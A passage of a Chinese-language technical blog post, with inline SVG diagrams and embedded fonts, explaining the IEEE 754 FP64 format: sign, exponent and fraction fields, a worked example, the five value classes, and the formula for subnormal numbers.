class="stroke-B1" style="stroke-width:0"/></g><text x="375.5" y="33" class="fill-N1" style="font-family:'d2-1928264720-font-regular';text-anchor:middle;font-size:28px">Normal FP64</text></g><g id="result"><g class="shape"><path fill="transparent" d="M0 334h751v83H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="375.5" y="386.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:30px">x = (-1) × 0.5 × 1.875 = -0.9375</text></g><g id="bin.'s = sign (1 bit)'" class="header"><g class="shape"><path fill="#fff0f5" d="M0 46h190v82H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="95" y="92.5" class="text-bold text-underline fill-N1" style="text-anchor:middle;font-size:16px">s = sign (1 bit)</text></g><g id="bin.'e = exponent (11 bit)\n(1≤e≤2046)'" class="header"><g class="shape"><path fill="#e6e6fa" d="M190 46h267v82H190z" class="stroke-B1" style="stroke-width:0"/></g><text x="323.5" y="84.5" class="text-bold text-underline fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="323.5" dy="0">e = exponent (11 bit)</tspan><tspan x="323.5" dy="18.5">(1≤e≤2046)</tspan></text></g><g id="bin.'m = fraction (52 bit)'" class="header"><g class="shape"><path fill="#f0f8ff" d="M457 46h294v82H457z" class="stroke-B1" style="stroke-width:0"/></g><text x="604" y="92.5" class="text-bold text-underline fill-N1" style="text-anchor:middle;font-size:16px">m = fraction (52 bit)</text></g><g id="bin.1"><g class="shape"><path fill="pink" d="M0 128h190v82H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="95" y="174.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">1</text></g><g id="bin.01111111110"><g class="shape"><path fill="#d8bfd8" d="M190 128h267v82H190z" class="stroke-B1" style="stroke-width:0"/></g><text x="323.5" y="174.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">01111111110</text></g><g id="bin.'11100000000000000000000000\n00000000000000000000000000'"><g class="shape"><path fill="#add8e6" d="M457 128h294v82H457z" class="stroke-B1" style="stroke-width:0"/></g><text x="604" y="166.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="604" dy="0">11100000000000000000000000</tspan><tspan x="604" dy="18.5">00000000000000000000000000</tspan></text></g><g id="bin.xx1" class="shape"><path fill="transparent" d="M0 210h190v124H0z" class="stroke-B1" style="stroke-width:0"/></g><g id="bin.xx2" class="shape"><path fill="transparent" d="M190 210h267v124H190z" class="stroke-B1" style="stroke-width:0"/></g><g id="bin.'M=(1.m₅₁m₅₀...m₀)₂\n=(1.111000000...)₂\n=1.875'"><g class="shape"><path fill="transparent" d="M457 210h294v124H457z" class="stroke-B1" style="stroke-width:0"/></g><text x="604" y="256.5" fill="#00008b" class="text-bold" style="text-anchor:middle;font-size:24px"><tspan x="604" dy="0">M=(1.m₅₁m₅₀...m₀)₂</tspan><tspan x="604" dy="26.333">=(1.111000000...)₂</tspan><tspan x="604" dy="26.333">=1.875</tspan></text></g><g id="bin.xx1.'S=(-1)^s\n =(-1)^1\n=-1'"><g class="shape"><path fill="transparent" d="M0 210h131v124H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="65.5" y="256.5" fill="#cd5c5c" class="text-bold" style="text-anchor:middle;font-size:24px"><tspan x="65.5" dy="0">S=(-1)^s</tspan><tspan x="65.5" dy="26.333"> =(-1)^1</tspan><tspan x="65.5" dy="26.333">=-1</tspan></text></g><g id="bin.xx1.×"><g class="shape"><path fill="transparent" d="M131 210h59v124h-59z" class="stroke-B1" style="stroke-width:0"/></g><text x="160.5" y="280.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:24px">×</text></g><g id="bin.xx2.'2^E=2^(e-1023)\n=2^(1022-1023)\n=2^(-1)'"><g class="shape"><path fill="transparent" d="M190 210h208v124H190z" class="stroke-B1" style="stroke-width:0"/></g><text x="294" y="256.5" fill="#9400d3" class="text-bold" style="text-anchor:middle;font-size:24px"><tspan x="294" dy="0">2^E=2^(e-1023)</tspan><tspan x="294" dy="26.333">=2^(1022-1023)</tspan><tspan x="294" dy="26.333">=2^(-1)</tspan></text></g><g id="bin.xx2.×"><g class="shape"><path fill="transparent" d="M398 210h59v124h-59z" class="stroke-B1" style="stroke-width:0"/></g><text x="427.5" y="280.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:24px">×</text></g><mask id="d2-1928264720" width="751" height="417" x="0" y="0" maskUnits="userSpaceOnUse"><path fill="#fff" d="M0 0h751v417H0z"/><path fill="rgba(0,0,0,0.75)" d="M301 5h149v36H301zM178.5 356.5h394v38h-394zM46.5 76.5h97v21h-97zM251.5 68.5h144v37h-144zM535 76.5h138v21H535zM91.5 158.5h7v21h-7zM277 158.5h93v21h-93zM494 150.5h220v37H494zM479.5 232.5h249v79h-249zM22.5 232.5h86v79h-86zM153.5 256.5h14v31h-14zM212.5 232.5h163v79h-163zM420.5 256.5h14v31h-14z"/></mask></svg></svg></figure><p >我们常用科学计数法 $\pm a \times p^n$ 表示大数。FP64 也是类似的，只不过是在二进制意义下。FP64 使用如下公式，将 s, e, m 组合成实数 x：</p><p >$$\begin{align}x = (-1)^s \times 2^{e-1023} \times \left(1+m / 2 ^{52}\right) \label{eq:normal}\end{align}$$</p><p >不难发现其与科学计数法的相似性。FP64 将底数的范围固定为 $[1,2)$，最后的 52 位 m 正是底数的小数部分；中间的 11 位 e 取值范围为 $[1, 2046]$，用于合成指数；而最高位的符号位 s 顾名思义，即指示 x 的正负性。在后文中，为了叙述方便，我们也会将 x 的 FP64 表示中的这三部分记为 $\text{fp}_s(x)$、$\text{fp}_e(x)$ 和 $\text{fp}_m(x)$。</p><p >细心的读者可能又会奇怪了，为什么 e 的范围是 $[1, 2046]$ 呢？e 有 11 位，理论上取值范围应该是 $[0, 2047]$，还有两个值 $e=0$ 和 $e=2047$ 去哪了？</p><p >事实上，这两个值被 IEEE 754 特意空了出来，用于表示一些特殊的值。比如当 $s = e = m = 0$ 时，x 的值为 +0。更具体些，根据 e 和 m 的不同取值，FP64 的值可以分为以下五类：</p><ul><li>$e \in [1, 2046]$ 时，$x$ 为 Normal；</li><li>$e=2047, m = 0$ 时，$x$ 为 ±Infinity；</li><li>$e=2047, m \not = 0$ 时，$x$ 为 NaN；</li><li>$e = 0, m = 0$ 时，$x$ 为 ±0；</li><li>$e = 0, m \not = 0$ 时，$x$ 为 Subnormal。</li></ul><p >本文只关注最后一类 Subnormal 浮点数，以下简称 Subnormal FP。</p><h2 id="subnormal-fp">Subnormal FP</h2><p >Subnormal FP，顾名思义，即比 Normal FP 还要小的一类数。事实上，它们的计算也有别于 Normal FP：</p><p >$$\begin{equation}x = (-1)^s \times 2^{-1022} \times (m / 2^{52}) \label{eq:subnormal}\end{equation}$$</p><p >下图给出了一个 Subnormal 浮点数 $x=-3\times 2^{-1074}$ 的例子</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="501" height="292" preserveAspectRatio="xMinYMin meet" viewBox="0 0 715 417"><svg id="d2-svg" width="715" height="417" class="d2-2895707930" viewBox="0 0 715 417"><rect width="715" height="417" stroke-width="0" rx="0" style="fill:#fff"/><style>@font-face{font-family:d2-2895707930-font-regular;src:url(data:application/font-woff;base64,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)}.text-underline{text-decoration:underline}.d2-2895707930 .text-bold{font-family:'d2-2895707930-font-bold'}@font-face{font-family:d2-2895707930-font-bold;src:url(data:application/font-woff;base64,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)}.shape{shape-rendering:geometricPrecision;stroke-linejoin:round}.d2-2895707930 .fill-N1{fill:#0a0f25}.d2-2895707930 .stroke-B1{stroke:#0d32b2}</style><g id="bin"><g class="shape"><path fill="transparent" d="M0 0h715v334H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="357.5" y="33" class="fill-N1" style="font-family:'d2-2895707930-font-regular';text-anchor:middle;font-size:28px">Subnormal FP64</text></g><g id="result"><g class="shape"><path 